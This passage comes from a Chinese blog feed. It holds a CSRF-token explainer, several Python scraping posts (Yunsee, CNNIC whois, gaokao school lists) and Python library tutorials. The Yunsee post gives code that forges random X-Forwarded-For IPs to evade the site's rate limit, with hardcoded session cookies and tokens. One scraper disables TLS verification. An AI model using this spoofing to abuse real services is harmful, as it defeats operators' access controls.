token</h5><p>CSRF的本质：其本质原因是：重要操作的所有参数都是可以被攻击者猜测到的</p><p>于是可以通过把参数加密或者使用一些随机数，从而让攻击则无法猜测到参数值</p><p>新增一个参数token，token的值是随机的，只被用户和服务器所共有，不被第三者知晓</p><p>将token同时放在表单和session中，若不一致，则可能为CSRF攻击</p><p>使用token时的原则：</p><p>足够的随机性，使用安全的随机数生成器生成token</p><p>保密性，token尽量放在表单中，把敏感操作由get改为post，由表单提交</p><p>###</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>云悉-爬取域名信息</title>
    <link href="http://yoursite.com/2018/08/18/%E4%BA%91%E6%82%89-%E7%88%AC%E5%8F%96%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
    <id>http://yoursite.com/2018/08/18/云悉-爬取域名信息/</id>
    <published>2018-08-18T13:21:45.000Z</published>
    <updated>2018-08-22T09:14:17.790Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="要达成的目的"><a href="#要达成的目的" class="headerlink" title="要达成的目的"></a>要达成的目的</h1><p>从云悉网在极短时间内多次获取要查询的域名信息，以在渗透测试前期对目标进行快速的信息收集</p><h1 id="目标网址"><a href="#目标网址" class="headerlink" title="目标网址"></a>目标网址</h1><p><a href="http://www.yunsee.cn" target="_blank" rel="noopener">http://www.yunsee.cn</a></p><p>云悉：WEB资产梳理、在线CMS指纹识别平台</p><h1 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h1><p>经过两次查询发现，云悉存在查询的时间间隔限制，大概在1分钟左右，通过F12，在网络一栏，一个个找请求成功的包，看post的200的请求，在响应里，找到我们想要的，类似于</p><p>whois_isp    Alibaba Cloud Computing (Beijing) Co., Ltd.<br>whois_mail    <a href="mailto:DomainAbuse@service.aliyun.com" target="_blank" rel="noopener">DomainAbuse@service.aliyun.com</a><br>whois_date    2019-01-23 06:48:26<br>ip    223.7.8.143<br>icp_id    京ICP备13013886号<br>cdn<br>os    Windows<br>server    Microsoft-IIS/7.5<br>whois_dns    dns13.hichina.com,dns14.hichina.com<br>whois_name    null<br>icp_name    北京谷安天下科技有限公司<br>create    2018-08-18 21:43:54</p><p>然后在消息头里编辑和重发</p><h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><p>云悉不允许频繁查询，所以我们想到了代理池，然而代理池多数要花钱，所以最后用随机ip数的方法解决</p><h4 id="第一种随机ip方法"><a href="#第一种随机ip方法" class="headerlink" title="第一种随机ip方法"></a>第一种随机ip方法</h4><p>import random</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>for i in range(0, 500):<br>    choice = (<br>        random.randint(1, 2),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 4),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>        random.randint(1, 3),<br>    )</p><p>headers[“X-Forwarded-For”] = (str(random.randint(1, 255)) + “.”) + (str(random.randint(1, 255)) + “.”) + (<br>        str(random.randint(1, 255)) + “.”) + str(random.randint(1, 255))</p><h4 id="第二种随机ip方法"><a href="#第二种随机ip方法" class="headerlink" title="第二种随机ip方法"></a>第二种随机ip方法</h4><p>import random<br>import socket<br>import struct</p><p>headers{‘X-Forwarded-For’: ‘%s’}</p><p>random_ip =socket.inet_ntoa(struct.pack(‘&gt;I’, random.randint(1, 0xffffffff)))</p><p>headers[“X-Forwarded-For”] = random_ip</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># -*- coding: utf-8 -*</span><br><span class="line">import requests</span><br><span class="line">import random</span><br><span class="line">import json</span><br><span class="line">import random</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def post(domain):</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line">        Auther: 史前、祝融</span><br><span class="line">        post函数用于向云悉请求要查询的域名信息，包括备案单位、邮箱、域名所有者、备案号、DNS、域名注册商</span><br><span class="line">        :param domain: 用于传递要查询的域名</span><br><span class="line">        :return: 正常查询：返回的是以Json格式呈现的域名信息</span><br><span class="line">                 异常查询：返回的是异常的原因</span><br><span class="line">        &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">        #设置随机IP，以避过单个ip查询频繁限制</span><br><span class="line">        random_ip = socket.inet_ntoa(struct.pack(&apos;&gt;I&apos;, random.randint(1, 0xffffffff)))</span><br><span class="line">        headers =&#123;</span><br><span class="line">        &apos;Host&apos;: &apos;www.yunsee.cn&apos;,</span><br><span class="line">        &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0&apos;,</span><br><span class="line">        &apos;Accept-Language&apos;: &apos;en-US,en;q=0.5&apos;,</span><br><span class="line">        &apos;Accept-Encoding&apos;: &apos;gzip, deflate&apos;,</span><br><span class="line">        &apos;Referer&apos;: &apos;http://www.yunsee.cn/&apos;,</span><br><span class="line">        &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;,</span><br><span class="line">        &apos;X-Requested-With&apos;: &apos;XMLHttpRequest&apos;,</span><br><span class="line">        &apos;Content-Length&apos;: &apos;97&apos;,</span><br><span class="line">        &apos;Cookie&apos;: &apos;__cfduid=d615e3e4064581ccc283392de521cc58b1534506150; yjs_id=54ba88144fa537011258f5befd166064; ctrl_time=1; Hm_lvt_020d18ec72d744884bf6b81cc118775b=1534507185,1534586778,1534587126,1534587154; laravel_session=eyJpdiI6IlNlbHg0WlBaYmVqWGd1ckdkZlFqT0E9PSIsInZhbHVlIjoiU1dDOWZtdGJkZVBIMHY3ckwyTFMyR21YYVFUTVFmSlBDSzVnTnE0Q0hBYnFIVXVjWkQ5dWkxQWdwVmNvTTdYdkFWMmVyeTNHRGJnXC9NYXRJRUt0d3RRPT0iLCJtYWMiOiJjOTg1MjlmNjlmM2MzZTg4MDYyOTU2OWM3MjA5NzNiZWU4YTdkN2Y1MTg4MjljNDlhMDMzYmQ3NzIyN2Y4MWRkIn0%3D; Hm_lpvt_020d18ec72d744884bf6b81cc118775b=1534587154&apos;,</span><br><span class="line">        &apos;Connection&apos;: &apos;keep-alive&apos;,</span><br><span class="line">        &apos;X-Forwarded-For&apos;: &apos;%s&apos;</span><br><span class="line">        &#125;</span><br><span class="line">        #向headers中的X-Forwarded-For参数传递随机IP</span><br><span class="line">        headers[&quot;X-Forwarded-For&quot;] = random_ip</span><br><span class="line">        #yunsee查询页面的url</span><br><span class="line">        url = &apos;http://www.yunsee.cn/home/getInfo&apos;</span><br><span class="line">        #异常捕获</span><br><span class="line">        try:</span><br><span class="line">            data = &#123;&apos;type&apos;:&apos;webinfo&apos;, &apos;string&apos;:&apos;d879af297g54df45&apos;, &apos;url&apos;:domain, &apos;_token&apos;:&apos;wv8Y74w1owhw0glf9gPvyIlfFrSaIvzIz9g8dU6i&apos;&#125;</span><br><span class="line">            #设置post的数据，以及超时时间</span><br><span class="line">            r = requests.post(url,headers=headers,data=data,timeout=15)</span><br><span class="line">            #捕获连接异常</span><br><span class="line">    </span><br><span class="line">            rcontent = r.content.decode()</span><br><span class="line">            # 对要查询的域名是否在白名单进行判断</span><br><span class="line">            if &quot;禁止&quot; in json.loads(rcontent)[&apos;mess&apos;]:</span><br><span class="line">                return &quot;不允许查询&quot;</span><br><span class="line">    </span><br><span class="line">            # 以Json格式返回数据</span><br><span class="line">            return json.loads(rcontent)[&apos;res&apos;]</span><br><span class="line">        except requests.ConnectionError as e:</span><br><span class="line">                return &quot;网络问题&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    post(&quot;aliyun.com&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>x-path爬取CNNIC</title>
    <link href="http://yoursite.com/2018/08/18/X-path%E7%88%AC%E5%8F%96CNNIC/"/>
    <id>http://yoursite.com/2018/08/18/X-path爬取CNNIC/</id>
    <published>2018-08-18T09:05:45.000Z</published>
    <updated>2018-08-18T13:51:04.996Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="XPath介绍"><a href="#XPath介绍" class="headerlink" title="XPath介绍"></a><strong>XPath介绍</strong></h1><p>XPath在python的爬虫学习中，起着举足轻重的地位，对比正则表达式 re两者可以完成同样的工作，实现的功能也差不多，但XPath明显比re具有优势，在网页分析上使re退居二线 。全称为<strong>XML Path Language</strong> 一种小型的<strong>查询语言</strong> 。</p><h1 id="它所具备的优点："><a href="#它所具备的优点：" class="headerlink" title="它所具备的优点："></a>它所具备的优点：</h1><p>1） 可在XML中查找信息   </p><p>2） 支持HTML的查找   </p><p>3） 通过元素和属性进行导航  </p><h1 id="python使用XPath"><a href="#python使用XPath" class="headerlink" title="python使用XPath"></a>python使用XPath</h1><p>由于XPath属于lxml库模块，所以首先要安装库lxml，可用<code>pip install  lxml</code>  安装，pip库的安装自行百度</p><h1 id="x-path简单调用方法"><a href="#x-path简单调用方法" class="headerlink" title="x-path简单调用方法"></a>x-path简单调用方法</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from lxml import  etree  </span><br><span class="line"></span><br><span class="line">selector=etree.HTML(源码)  #将源码转化为能被XPath匹配的格式selector.xpath(表达式) </span><br><span class="line"></span><br><span class="line">bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import lxml</span><br><span class="line">from lxml import etree</span><br><span class="line">def get():</span><br><span class="line">   headers = &#123;</span><br><span class="line">   &apos;user-Agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36&apos;,</span><br><span class="line">   &#125;</span><br><span class="line">   url = &apos;http://ipwhois.cnnic.cn/bns/query/Query/ipwhoisQuery.do?txtquery=8.8.8.8&amp;queryOption=ipv4&apos;</span><br><span class="line">   req = requests.get(url,headers=headers)</span><br><span class="line">   #etree提供了更快速方便解析提取html页面数据的方式</span><br><span class="line">   shuju = etree.HTML(req.text)</span><br><span class="line">   bg = shuju.xpath(&apos;/html/body/center[1]/table[1]/tr/td/font&apos;)</span><br><span class="line">   #将两个列表组成字典</span><br><span class="line">   res = dict(zip([x.text for x in bg[::2]],[x.text for x in bg[1::2]]))</span><br><span class="line">   for k,v in res.items():</span><br><span class="line">      print(k,v)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">   get()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-4</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-4/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-4/</id>
    <published>2018-08-15T14:46:29.000Z</published>
    <updated>2018-08-15T16:20:08.938Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><p>爬虫，用Python写的很多的，re模块，BeautifulSoup模块，pyspider模块，pyquery等等</p><p>还要用到requests模块，urllib模块，urllib2模块，还有一个四叶草公司开发的hackhttp等等</p><p>BeautifulSoup模块和requests模块，Pyspider都要安装，因为是第三方库</p><p>目标网站：<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%1.html</a></p><p>要实现的目标是爬取学校的名字，并按省份分类放置</p><p>代码如下：</p><p>#encoding=utf-8</p><p>import  requests<br>import lxml<br>import json<br>import logging   #解决ssl错误的<br>import sys<br>from bs4 import BeautifulSoup as bs<br>logging.captureWarnings(True)<br>reload(sys)     #解决编码问题的<br>sys.setdefaultencoding(‘utf-8’)<br>def school():<br>    for i in range(2, 34, 1):<br>        try:<br>           url = ‘<a href="https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)" target="_blank" rel="noopener">https://gaokao.chsi.com.cn/gkxx/zszcgd/dnzszc/201706/20170615/1611254988-%s.html&#39;%(str(i)</a>)<br>           headers = {<br>               ‘User-Agent’: ‘Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0’}<br>           r = requests.get(url=url,headers=headers,verify=False)<br>           soup = bs(r.content,’lxml’)<br>           content2 = soup.find_all(name=”td”, attrs={“colspan”: “7”})[0].string<br>           f1 = open(“D:/%s.txt” % (content2), “wb”)<br>           content = soup.find_all(name=’tr’,attrs={“height”:”29”})<br>           for content1 in content:<br>             try:<br>               soup_content = bs(str(content1), “lxml”)<br>               soup_content1 = soup_content.find_all(name=”td”)<br>               f1.write(soup_content1[1].string +’\n’)<br>               print(soup_content1[1].string)<br>             except IndexError:<br>                 pass<br>        except IndexError:<br>            pass</p><p>if <strong>name</strong>==’<strong>main</strong>‘:<br>    school()</p><p>爬虫遇到的问题：</p><p><code>requests.exceptions.SSLError: HTTPSConnectionPool(host=&#39;gaokao.chsi.com.cn&#39;, port=443): Max retries</code> </p><p>解决方法：</p><p>import logging</p><p>logging.captureWarnings(True)</p><p>r = requests.get(url=url,verify=False)</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-3</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8Cpython%E5%BD%93%E6%AD%8C-3/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，python当歌-3/</id>
    <published>2018-08-15T12:55:29.000Z</published>
    <updated>2018-08-15T16:23:29.467Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="常用的系统库"><a href="#常用的系统库" class="headerlink" title="常用的系统库"></a>常用的系统库</h1><p>Python 的标准库包括了很多的模块, 从 Python 语言自身特定的类型和声明, 到一些只用于少数程序的不著名的模块.</p><h3 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h3><p>可以通过help命令查看其文档</p><p>sys.argv是变量，命令行参数，专门向Python解释器传递参数他的功能是获取程序外部向程序传递的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import sys</span><br><span class="line">print &quot;THIS FILE NAME IS:&quot;,sys.argv[0]</span><br></pre></td></tr></table></figure></p><p>结果是<code>THIS FILE NAME IS: D:/yinjijn.py</code></p><p>sys.stdin,sys.stdout,sys.stderr<br>处理标准输入，标准输出，标准错误</p><p>输出和错误是内建在每个unix系统中的管道<br>print的本质就是sys.stdout.write<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">for i in range(6):</span><br><span class="line">    print &quot;attck&quot;</span><br></pre></td></tr></table></figure></p><p>等同于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line">import  sys</span><br><span class="line">for i in range(6):</span><br><span class="line">    sys.stdout.write(&quot;just do it\n&quot;)</span><br></pre></td></tr></table></figure></p><p>stdout是一个类文件对象，调用了它的write函数就可以打印任何的字符串了，它不会自己添加回车，要我们添加\n但是只有write的办法，木有read的方法<br>是由于是类文件对象，因此你可以将任何类文件赋值，然后重定向输出</p><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a><strong>os模块</strong></h3><p>常用的几个</p><p>import os</p><p>os.name      #判断现在正在实用的平台，Windows平台”nt”,linux平台”posix”</p><p>os.getcwd()        #获取当前目录</p><p>os.listdir(“D:/blog”)         #列D:/blog文件夹的目录</p><p>os.mkdir(“D:/gooann”)        #在本文件x夹下建立一个叫gooann的文件夹</p><p>os.listdir(“D:/gooann/items”)  #查看目录文件夹</p><p> os.rmdir(“blog”) #删除叫blog的文件夹</p><p>os.rename(“test.txt”,”test1.txt”) #将test.txt重名为test1.txt</p><p>os.remove(“test1.txt”)  #删除test1.txt的文件</p><p>os库提供了在Python中使用操作系统的命令的方法就是用os.system(）</p><h3 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a><strong>time模块</strong></h3><p>time模块很常用的，可以精确的知道程序的运行长短，看看常用的 </p><p>import time</p><p>time.time()   #获取当前时间的时间戳</p><p>1503480040.985</p><p> time.clock()  #获取进程的时间</p><p>60.641674890547975</p><p> time.localtime()  #时间戳转换成当地的时间</p><p>time.struct_time(tm_year=2017, tm_mon=8, tm_mday=23, tm_hour=17, tm_min=20, tm_sec=48, tm_wday=2, tm_yday=235, tm_isdst=0)</p><p>time.asctime()  #将元祖表示为’Wed Aug 23 17:24:07 2017’这种形式</p><h3 id="json模块"><a href="#json模块" class="headerlink" title="json模块"></a>json模块</h3><p>传递数据的XML和JSON</p><p>JSON(JavaScript Object Notation, JS 对象标记) 是一种轻量级的数据交换格式。它基于 ECMAScript (w3c制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p><p>Python标准库中有JSON模块，主要是两个功能，序列化(encoding)与反序列化(decoding)</p><h5 id="encoding操作-dumps"><a href="#encoding操作-dumps" class="headerlink" title="encoding操作 :dumps()"></a>encoding操作 :dumps()</h5><p>#encoding=utf-8<br>import json<br>data = [{“username”:”gooann”,”password”:”shiqian”,”content”:(“shiqian”,”secer”)}]<br>print data<br>[{‘username’: ‘gooann’, ‘content’: (‘shiqian’, ‘secer’), ‘password’: ‘shiqian’}]<br>data_json = json.dumps(data)  #将data进行格式的编码转换<br>print data_json<br>[{“username”: “gooann”, “content”: [“shiqian”, “secer”], “password”: “shiqian”}]</p><p>这里的data_json是str类型，data是list类型</p><h5 id="decoding操作：loads"><a href="#decoding操作：loads" class="headerlink" title="decoding操作：loads()"></a>decoding操作：loads()</h5><p>data_load = json.loads(data_json)<br>print data_load</p><p>[{u’username’: u’gooann’, u’content’: [u’shiqian’, u’secer’], u’password’: u’shiqian’}]</p><h3 id="hashlib模块"><a href="#hashlib模块" class="headerlink" title="hashlib模块"></a>hashlib模块</h3><p>Python中的hashlib库提供了大量的摘要算法，又叫散列算法，哈希算法</p><p>口算一下MD5</p><p>#encoding=utf-8<br>import hashlib<br>md5 = hashlib.md5( )<br>md5.update(‘admin’)<br>print md5.hexdigest( )</p><p>21232f297a57a5a743894a0e4a801fc3</p><h3 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a><strong>random模块</strong></h3><p>就是生成随机数的</p><p>#encoding=utf-8<br>import random<br>random.random()  #生成大于等于0，小于等于1的随机浮点数<br>random.uniform(66,88)  #生成66到88之间的随机浮点数<br>80.51121638510607<br>random.randint(66,88)  #生成66到88的整数<br>88<br>random.choice(‘url’) #在url生成随机字符<br>‘u’<br>look = [1,2,3,4,5,6]<br>random.shuffle(look)  #打乱数字<br>look<br>[1, 4, 3, 5, 2, 6]</p><h1 id="常用的第三方库"><a href="#常用的第三方库" class="headerlink" title="常用的第三方库"></a>常用的第三方库</h1><p>第三方库顾名思义，得下载安装</p><p>安装第三方库</p><h5 id="第一种方法："><a href="#第一种方法：" class="headerlink" title="第一种方法："></a>第一种方法：</h5><p>用源码安装，去哪找呢？百度，谷歌，GitHub下载，下载好了压缩包，解压<br>LINUX或者MAC就直接git clone，然后进入目录，大部分都是都有setup.py，然后执行命令</p><p><code>python setup.py install</code></p><p>如果是Windows系统</p><p>打开目录，然后shift+右键，在此打开cmd/Powershell窗口，打开，然后执行命令</p><p><code>python setup.py install</code></p><h5 id="第二种方法："><a href="#第二种方法：" class="headerlink" title="第二种方法："></a>第二种方法：</h5><p>pip安装或者easy_install安装<br>简单粗暴，他们的第三方库都来自一个网站：<a href="http://pypi.python.org/pypi" target="_blank" rel="noopener">http://pypi.python.org/pypi</a><br>pip也要安装unix平台<br>$ sudo yum install python-pip<br>$ sudo apt-get install python-pip</p><p>Windows平台<br>可以下载get-pip.py<br>地址：<a href="https://bootstrap.pypa.io/get-pip.py" target="_blank" rel="noopener">https://bootstrap.pypa.io/get-pip.py</a><br>然后python get-pip.py</p><p>unix也可以用这种方法, pip install 第三方库的名称</p><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><p>用于程序进行http协议的get和post的模块 </p><h5 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h5><p>尝试获取某个页面，得到了一个请求实例</p><p>#encoding=utf-8<br>import requests<br>url = requests.get(“<a href="http://www.gooann.com&quot;" target="_blank" rel="noopener">http://www.gooann.com&quot;</a>)</p><p>获取cookies       print url.cookies</p><p>获取头部信息        url.headers</p><p>http响应状态码       url.status_code</p><p>网页内容              url.text</p><p>以二进制的方式打开服务器并返回数据      url.content</p><h5 id="POST请求"><a href="#POST请求" class="headerlink" title="POST请求"></a>POST请求</h5><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}</p><p> r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>, data=payload)</p><p> print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {<br>    “key1”: “value1”,<br>    “key2”: “value2”<br>  },<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “23”,<br>    “Content-Type”: “application/x-www-form-urlencoded”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>没有data参数</p><p>r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>)</p><p>print r.text</p><p>{<br>  “args”: {},<br>  “data”: “”,<br>  “files”: {},<br>  “form”: {},<br>  “headers”: {<br>    “Accept”: “<em>/</em>“,<br>    “Accept-Encoding”: “gzip, deflate”,<br>    “Connection”: “close”,<br>    “Content-Length”: “0”,<br>    “Host”: “httpbin.org”,<br>    “User-Agent”: “python-requests/2.18.4”<br>  },<br>  “json”: null,<br>  “origin”: “113.135.83.181”,<br>  “url”: “<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a><br>}</p><p>当data被赋值了之后，结果中才会多了form值，而form值就是post给服务器的内容</p><h3 id="PIL模块"><a href="#PIL模块" class="headerlink" title="PIL模块"></a>PIL模块</h3><p>python Imaging Library (PIL)是PythonWare公司提供的免费的图像处理工具包，是python下的图像处理模块，支持多种格式，并提供强大的图形与图像处理功能。</p><p>安装：UNIX平台<br>sudo apt-get install python-imaging<br>MAC平台<br>sudo easy_install PIL<br>Windows：<br>去官网直接下载exe安装，傻瓜式操作，传送门:<a href="http://pythonware.com/products/pil/" target="_blank" rel="noopener">http://pythonware.com/products/pil/</a></p><p>#####</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Python" scheme="http://yoursite.com/categories/Python/"/>
    
    
      <category term="Python" scheme="http://yoursite.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>人生苦短，Python当歌-2</title>
    <link href="http://yoursite.com/2018/08/15/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8CPython%E5%BD%93%E6%AD%8C-2/"/>
    <id>http://yoursite.com/2018/08/15/人生苦短，Python当歌-2/</id>
    <published>2018-08-15T07:32:29.000Z</published>
    <updated>2018-08-15T12:40:43.561Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>繁华一场梦<br><img src="\images\pasted-95.png" alt="upload successful"></p><h1 id="理解Python函数"><a href="#理解Python函数" class="headerlink" title="理解Python函数"></a>理解Python函数</h1><p>在高中时代，就可以这么定义函数—–f(x)=8x+8 </p><p>在函数中，并没有规定函数是一个数，它可是任何东西，你想是啥就是啥，变量的本质，可以当作一个占位符</p><h1 id="定义函数"><a href="#定义函数" class="headerlink" title="定义函数"></a>定义函数</h1><p>代码块以 def 关键词开头，def这个简写来自define，后接函数标识符名称和圆括号()。<br>定义函数内容以冒号起始，然后必须缩进（四个空格或者一个tab键）</p><p>def 函数名(参数):<br>        函数体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#encoding=utf-8</span><br><span class="line"></span><br><span class="line">def    geturl( ):</span><br><span class="line"></span><br><span class="line">​           print   &quot;get  it&quot;</span><br><span class="line"></span><br><span class="line">geturl( )</span><br></pre></td></tr></table></figure></p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>一般情况，要将返回的值传给一个变量，然后通过变量打印出来，如果没有，那就没有回显了</p><h1 id="全局变量and局部变量"><a href="#全局变量and局部变量" class="headerlink" title="全局变量and局部变量"></a>全局变量and局部变量</h1><p>局部变量：只在函数体内（某个范围内）起作用的就叫局部变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#coding = utf-8</span><br><span class="line"></span><br><span class="line">a = &apos;ad&apos;</span><br><span class="line">def  getit():</span><br><span class="line">        a = &apos;look&apos;</span><br><span class="line">        print &quot;this a is&quot;,a</span><br><span class="line">demo()</span><br><span class="line">print 